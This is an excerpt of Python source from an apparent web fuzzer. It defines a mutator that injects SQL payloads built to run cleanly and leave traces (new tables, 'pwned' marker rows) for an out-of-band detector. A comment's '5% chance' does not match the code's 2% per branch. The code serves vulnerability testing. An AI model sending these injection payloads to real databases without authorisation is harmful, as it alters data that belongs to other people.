...
class ErrorFreeSQLiPayloadParamMutator(ParamMutator):
    """
    Generates error-free SQL injection payloads that execute successfully
    These create side effects (tables, rows) detectable by the OOB server
    """
    def mutate(self, string):
        rand_id = random.randint(1000, 9999)
        
        # 5% chance to inject each type of payload
        rand = random.random()
        
        if rand < 0.02:
            # Create a new table
            payload = f"'; CREATE TABLE IF NOT EXISTS FuzzDevilTable_{rand_id} (id INT PRIMARY KEY, data VARCHAR(255)); --"
        elif rand < 0.04:
            # Insert into marker table
            payload = f"'; INSERT INTO FuzzMarkerTable (marker) VALUES ('pwned_{rand_id}'); --"
        elif rand < 0.06:
            # Multi-statement: create and insert
            payload = f"'; CREATE TABLE IF NOT EXISTS FuzzTemp_{rand_id} (x INT); INSERT INTO FuzzTemp_{rand_id} VALUES ({rand_id}); --"
        elif rand < 0.08:
            # Union-based with side effect
            payload = f"' UNION SELECT 1,2,3; INSERT INTO FuzzMarkerTable (marker) VALUES ('union_{rand_id}'); --"
        elif rand < 0.10:
            # Stacked query with table creation
            payload = f"1; CREATE TABLE IF NOT EXISTS FuzzEvil_{rand_id} (evil INT); --"
        else:
            return None
...
class DefaultMutator(Mutator):
    def __init__(self):
        ...
        self.param_mutators = [
            ...
            ErrorFreeSQLiPayloadParamMutator(),  # NEW: Error-free SQLi payloads
